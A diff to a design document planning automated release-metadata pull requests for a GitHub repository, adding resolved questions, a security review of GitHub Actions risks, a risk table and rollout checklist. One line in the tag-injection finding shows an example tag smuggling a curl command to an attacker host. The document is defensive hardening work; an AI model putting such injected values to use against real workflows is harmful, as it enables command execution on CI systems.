@@ -121,11 +121,24 @@ The release workflow opens PR 2 itself, a separate identity approves it if and o
 - One extra workflow (`auto-approve-release-json.yml`) to maintain — and the auto-approval logic is security-sensitive. If a contributor ever gets the bot to open a PR containing arbitrary changes (e.g. by controlling the tag), the approver must refuse. The path-allow-list is the primary defence; the schema re-derivation is a belt-and-braces second check.
 - Release time increases by ~1–3 minutes for the extra PR + CI cycle.
 
-**Open questions**
+**Resolved questions**
 
-- Should the approver workflow also verify that the PR branch is `auto/release-json-*` and that the head SHA is reachable from the bot's push event, to defeat an attacker who convinces the approver to review an unrelated branch?
-- Do we want the approver to require at least one passing status check before approving, or approve immediately and let automerge wait for checks?
-- If `--ci --channel prerelease` cannot find all three platforms (e.g. macOS build failed), the script errors and writes nothing. Do we want the workflow to surface that as a release-workflow failure, or swallow it and continue?
+1. **Branch name guard.** Yes. The approver workflow must reject any PR
+   where `head.ref` does not match `^auto/release-json-v[0-9]`. This
+   prevents an attacker from re-targeting an unrelated branch at the
+   approver. Implemented as an `if:` condition on the approval job.
+
+2. **Approve vs wait for checks.** The approver approves immediately once
+   its own validation passes (path allow-list, SHA256 re-derivation,
+   branch name guard). Automerge then waits for required CI status checks
+   before squash-merging. The approval is a "this diff is structurally
+   valid" signal; CI is the quality gate.
+
+3. **Missing platform asset.** Fail the `update-release-json` job
+   explicitly. Surface it as a GitHub Actions annotation with a link to
+   the release. The release author needs to know which platform build did
+   not produce an asset so they can re-trigger or investigate. Do not
+   swallow the error or write partial metadata.
 
 ### Option B — Direct commit to `main` by a bypass-actor App _(alternative)_
 
@@ -179,16 +192,312 @@ Stop storing `release.json` and `os-list-velocity.json` on `main`. Instead publi
 
 ## Decision surface
 
-Pick at most one of A, B, C for the release-metadata path. The `main`-protection changes (raise approvals to 1, add admin bypass) stand independent of which option wins — they improve posture whether or not PR 2 is automated, and they are a prerequisite for scaling the contributor base.
+Pick at most one of A, B, C for the release-metadata path. The
+`main`-protection changes (raise approvals to 1, add admin bypass) stand
+independent of which option wins — they improve posture whether or not
+PR 2 is automated, and they are a prerequisite for scaling the
+contributor base.
 
-## Work units
+**Recommendation:** Option A. Option B trades isolation for convenience —
+the wrong trade when the goal is to tighten `main`. Option C is a
+structural redesign that solves a process problem; defer it unless the
+contributor base grows beyond a handful.
 
-Independent of which option is chosen, this work divides into:
+## Security review
 
-1. **Ruleset tightening.** Raise `required_approving_review_count` to 1, set `require_last_push_approval: true`, add `Repository admin` (and optional maintainer team) to `bypass_actors`. Document in `docs/platform/operations/`.
-2. **Release-metadata automation.** One of Options A / B / C above.
-3. **`CODEOWNERS`.** Add at minimum a default entry (`* @tyrion-skynet` or equivalent) so the 1-approval floor has a natural reviewer assignment. Consider per-path rules for `public_html/src/_data/release.json` and `image/os-list-velocity.json` if Option A is chosen and we later want to formalise the bot reviewer.
-4. **Operational docs.** Update `docs/platform/operations/rpi-imager.md` and any release-runbook docs to describe the new single-PR flow and the bypass policy.
+Pen-test-informed review of Option A. Findings are classified as
+CRITICAL (blocking — must be addressed before implementation) or
+informational (tracked, phased into stretch work).
+
+### S1: `pull_request_target` workflow injection — CRITICAL
+
+`auto-approve-release-json.yml` uses `pull_request_target` so it runs
+with repo secrets. This is the most exploited workflow trigger in the
+GitHub Actions ecosystem.
+
+**Requirements:**
+
+- The approver workflow must never call `actions/checkout` with
+  `ref: ${{ github.event.pull_request.head.ref }}`. It must not execute
+  any code from the PR branch.
+- Implement as a pure API-calling job: fetch PR metadata, validate,
+  approve-or-reject. No filesystem operations.
+- Add `if: github.event.pull_request.user.login == 'velocity-release-bot[bot]'`
+  at the job level.
+- The path-allow-list check must use
+  `GET /repos/{owner}/{repo}/pulls/{pull_number}/files` and reject if
+  any `filename` is outside `{public_html/src/_data/release.json,
+image/os-list-velocity.json}`. Check the `status` field — reject
+  `added` or `removed` operations on unexpected paths.
+- Add a security comment block at the top of the workflow file
+  explaining the `pull_request_target` constraints, so a future
+  contributor does not add a checkout step.
+
+### S2: SHA256 re-derivation is mandatory — CRITICAL
+
+The plan initially marked independent SHA256 re-derivation as optional.
+It is not. Without it, the approver trusts the PR's claimed hashes. If
+App #1's key is compromised, an attacker could open a PR with poisoned
+SHA256s pointing to a malicious binary. The approver would approve
+because the path check passes.
+
+**Requirements:**
+
+- The approver workflow must independently fetch the release assets from
+  the GitHub Release API, compute SHA256 in-workflow, and compare
+  against the values in the PR's JSON diff.
+- If the values do not match, post a review comment on the PR with the
+  mismatch details and reject.
+- This is the difference between "path-scoped auto-approval" and
+  "verified release-metadata auto-approval."
+
+### S3: tag name injection — informational
+
+`build-image.yml` triggers on `v*` tags. `$GITHUB_REF_NAME` flows into
+branch names, PR titles, commit messages, and the `--tag` argument. A
+tag like `v0.5.1-pre6$(curl attacker.com)` could inject shell commands
+if interpolated unsafely.
+
+**Requirements:**
+
+- Add a tag-format validation step at the top of the
+  `update-release-json` job. Reject any tag not matching
+  `^v[0-9]+\.[0-9]+\.[0-9]+(-[a-zA-Z0-9]+)?$`.
+- Assign `${{ github.ref_name }}` to an `env:` variable and reference
+  `$TAG` in `run:` blocks. Never use `${{ github.ref_name }}` in inline
+  shell interpolation.
+- Verify that `update-release-json.py` anchors its own tag regex.
+  Currently uses `re.match` which anchors at start but not end — add
+  `$` anchor.
+
+### S4: App private key management — informational
+
+Two GitHub App private keys are long-lived secrets.
+
+**Requirements:**
+
+- Store both keys as repo-level encrypted secrets (not org-level).
+- Scope App #1 (`velocity-release-bot`) to `contents:write` +
+  `pull_requests:write` only. No `actions:`, no `admin:`.
+- Scope App #2 (`velocity-release-approver`) to `pull_requests:write`
+  only.
+- Neither App needs `members:`, `packages:`, or any org-level
+  permission.
+- Document rotation procedure in `docs/platform/operations/`. Set a
+  calendar reminder — GitHub Apps do not auto-rotate keys.
+
+### S5: asset upload race condition — informational
+
+After `build-image.yml` uploads assets, the `update-release-json` job
+fetches them to compute SHA256. If GitHub's CDN has not propagated the
+asset, the script may fetch a partial upload and compute a wrong hash.
+
+**Requirements:**
+
+- Check the asset `state` field via the Release Assets API. Only proceed
+  when state is `uploaded`, not `starter`.
+- Add a retry loop with exponential backoff (3 attempts, 10s/30s/60s)
+  when fetching release assets.
+- If any platform asset is missing or in `starter` state after the final
+  retry, fail the job with a GitHub Actions annotation linking to the
+  release.
+
+### S6: `Signed-off-by` trailer — informational
+
+`web_commit_signoff_required: true` means the bot's commits must include
+a `Signed-off-by:` trailer with an email matching the committer
+identity.
+
+**Requirements:**
+
+- Use `Signed-off-by: velocity-release-bot[bot] <BOT_ID+velocity-release-bot[bot]@users.noreply.github.com>`
+  in the commit message. The `BOT_ID` is the App's numeric installation
+  ID, discoverable via the GitHub API.
+- Test on a throwaway repo before wiring into the real workflow.
+
+### S7: `os-list-velocity.json` stale `latest_version` — informational
+
+The `imager` block currently hardcodes `"latest_version": "1.0.0"`.
+`update-release-json.py` only updates the `os_list[0]` entry, not
+`imager.latest_version`. This field refers to the RPi Imager application
+version (not the OS image version) and is likely static.
+
+**Requirements:**
+
+- Confirm whether RPi Imager reads `imager.latest_version` as a
+  minimum-version gate. If yes, decide whether automation should touch
+  it. If no, add a code comment in `update-release-json.py` explaining
+  why it is static.
+
+## Risks
+
+| Risk                                           | Likelihood                     | Impact                                                                      | Mitigation                                                                  |
+| ---------------------------------------------- | ------------------------------ | --------------------------------------------------------------------------- | --------------------------------------------------------------------------- |
+| Approver workflow `pull_request_target` misuse | Low (if correctly constrained) | CRITICAL — arbitrary code execution with repo secrets                       | S1: checkout-free workflow, author guard, path allow-list, security comment |
+| Compromised App #1 key opens poisoned PR       | Low                            | CRITICAL — malicious binary SHA in release metadata                         | S2: independent SHA256 re-derivation in approver                            |
+| Tag name injection                             | Low (requires tag push access) | Medium — shell injection in workflow                                        | S3: validate tag format, use `env:` variables                               |
+| App private key leak                           | Low                            | High — `main` writable without review (Option B) or poisoned PRs (Option A) | S4: repo-scoped secrets, minimal permissions, documented rotation           |
+| Asset CDN propagation lag                      | Medium                         | Low — wrong SHA in metadata until manually corrected                        | S5: asset state check, retry with backoff, fail-loud                        |
+| `Signed-off-by` mismatch blocks commit         | Medium (first-time setup)      | Low — release delayed until format corrected                                | S6: test on throwaway repo first                                            |
+| RPi Imager `latest_version` misinterpreted     | Low                            | Low — Imager may prompt for unnecessary update                              | S7: confirm field semantics                                                 |
+| App key rotation missed                        | Medium                         | Medium — stale key eventually expires, blocking releases                    | S4: calendar reminder, documented procedure                                 |
+
+## Scope
+
+### Phase 1: Ruleset tightening (independent of option choice)
+
+**Summary:** Raise the `main` protection floor and add admin bypass.
+
+**Steps:**
+
+1. Update ruleset `6362131`: set `required_approving_review_count: 1`,
+   `require_last_push_approval: true`
+2. Add `Repository admin` to `bypass_actors` with `bypass_mode: always`
+3. Create `.github/CODEOWNERS` with `* @ddol` default entry <!-- link-ignore -->
+4. Document bypass policy in `docs/platform/operations/branch-protection.md`
+
+**Milestone:** can land before Option A work begins
+
+### Phase 2: GitHub App setup
+
+**Summary:** Create and install the two Apps with minimal permissions.
+
+**Steps:**
+
+1. Create `velocity-release-bot` GitHub App: `contents:write`,
+   `pull_requests:write`
+2. Create `velocity-release-approver` GitHub App: `pull_requests:write`
+3. Install both on `banshee-data/velocity.report`
+4. Store private keys as repo-level encrypted secrets
+5. Test token minting with `actions/create-github-app-token` on a
+   throwaway workflow
+6. Test `Signed-off-by` trailer format on a throwaway repo (S6)
+
+**Milestone:** Apps ready for Phase 3
+
+### Phase 3: Release-metadata PR workflow (Option A core)
+
+**Summary:** `build-image.yml` opens a release-metadata PR automatically
+after asset upload.
+
+**Steps:**
+
+1. Add tag-format validation step to `build-image.yml` (S3): reject
+   non-semver tags before any work begins
+2. Add `update-release-json` job to `build-image.yml`:
+   - Mint App #1 token
+   - Validate release assets are in `uploaded` state with retry (S5)
+   - Run `update-release-json.py --ci --channel <channel> --tag $TAG`
+   - Fail loudly if any platform asset is missing
+   - Commit with `Signed-off-by:` trailer, push to
+     `auto/release-json-$TAG`
+   - Open PR titled `[ci] update release.json for <tag>`
+3. Verify `update-release-json.py` tag regex is end-anchored (S3)
+4. Update `scripts/update-release-json.py` to check asset `state` field
+   before streaming (S5)
+
+**Milestone:** PR 2 opens automatically after every release build
+
+### Phase 4: Auto-approval workflow (Option A core)
+
+**Summary:** `auto-approve-release-json.yml` validates and approves the
+bot's PR so automerge can squash it.
+
+**Steps:**
+
+1. Create `auto-approve-release-json.yml` triggered on
+   `pull_request_target` for `velocity-release-bot[bot]`
+2. Add author guard: `if: github.event.pull_request.user.login ==
+'velocity-release-bot[bot]'`
+3. Add branch name guard: reject if `head.ref` does not match
+   `^auto/release-json-v[0-9]`
+4. Implement path allow-list check via REST API (S1): reject if any
+   changed file is outside the two known paths; check all `status` values
+5. Implement SHA256 re-derivation (S2): fetch release assets
+   independently, compute SHA256, compare against PR JSON
+6. On validation pass: approve using App #2 token, enable
+   `--auto --squash` merge
+7. On validation fail: post review comment with details, request changes
+8. Add security comment block at top of workflow file documenting
+   `pull_request_target` constraints (S1)
+9. Verify: no `actions/checkout` step exists anywhere in the workflow
+
+**Milestone:** full single-PR release flow operational
+
+### Phase 5: Operational documentation
+
+**Summary:** Update release runbooks and operational docs.
+
+**Steps:**
+
+1. Update `docs/platform/operations/rpi-imager.md` to describe
+   single-PR release flow
+2. Document App key rotation procedure in
+   `docs/platform/operations/branch-protection.md`
+3. Confirm `imager.latest_version` semantics in `os-list-velocity.json`
+   and document decision (S7)
+4. Add `CODEOWNERS` path rules for the two JSON files if formalising
+   bot reviewer
+
+**Milestone:** operational docs current
+
+### Stretch: Hardening (phased add-on)
+
+**Summary:** Defence-in-depth items that improve security posture beyond
+the core flow.
+
+**Steps:**
+
+1. Pin App workflow allow-list via the App permissions UI to only the
+   release workflow file
+2. Schedule quarterly App private key rotation; add calendar reminder
+3. Add per-path `CODEOWNERS` entries for `public_html/src/_data/release.json`
+   and `image/os-list-velocity.json` mapping to `@banshee-data/release-bots`
+4. Enable `require_code_owner_review: true` on the ruleset once
+   `CODEOWNERS` has adequate coverage
+5. Consider adding a nightly workflow that re-derives all SHA256s from
+   the latest releases and opens an issue if any mismatch is detected
+
+## Dependencies
+
+- Phase 2 depends on GitHub organisation admin access (App creation)
+- Phases 3–4 depend on Phase 2 (Apps must exist)
+- Phase 1 can land independently and should land first
+
+## Checklist
+
+### Outstanding
+
+- [ ] Update ruleset: approval count 0 → 1, last-push approval on (`S`)
+- [ ] Add admin bypass to ruleset (`S`)
+- [ ] Create `.github/CODEOWNERS` with default entry (`S`) <!-- link-ignore -->
+- [ ] Document bypass policy in `docs/platform/operations/` (`S`)
+- [ ] Create `velocity-release-bot` GitHub App (`S`)
+- [ ] Create `velocity-release-approver` GitHub App (`S`)
+- [ ] Store App private keys as repo-level secrets (`S`)
+- [ ] Test `Signed-off-by` trailer on throwaway repo — S6 (`S`)
+- [ ] Add tag-format validation step to `build-image.yml` — S3 (`S`)
+- [ ] End-anchor tag regex in `update-release-json.py` — S3 (`S`)
+- [ ] Add asset `state` check with retry to `update-release-json.py` — S5 (`S`)
+- [ ] Add `update-release-json` job to `build-image.yml` — Phase 3 (`M`)
+- [ ] Create `auto-approve-release-json.yml` — Phase 4 (`M`)
+- [ ] Implement path allow-list check in approver — S1 (`S`)
+- [ ] Implement SHA256 re-derivation in approver — S2 (`M`)
+- [ ] Add branch name guard to approver — S1 (`S`)
+- [ ] Add security comment block to approver workflow — S1 (`S`)
+- [ ] Verify no `actions/checkout` in approver workflow — S1 (`S`)
+- [ ] Update release runbook for single-PR flow (`S`)
+- [ ] Document App key rotation procedure (`S`)
+- [ ] Confirm `imager.latest_version` semantics — S7 (`S`)
+- [ ] End-to-end test on a prerelease tag (`M`)
+
+### Stretch
+
+- [ ] Pin App workflow allow-list in App permissions UI (`S`)
+- [ ] Schedule quarterly App key rotation (`S`)
+- [ ] Add per-path `CODEOWNERS` for release JSON files (`S`)
+- [ ] Enable `require_code_owner_review: true` on ruleset (`S`)
+- [ ] Nightly SHA256 re-derivation canary workflow (`M`)
 
 ## References
 
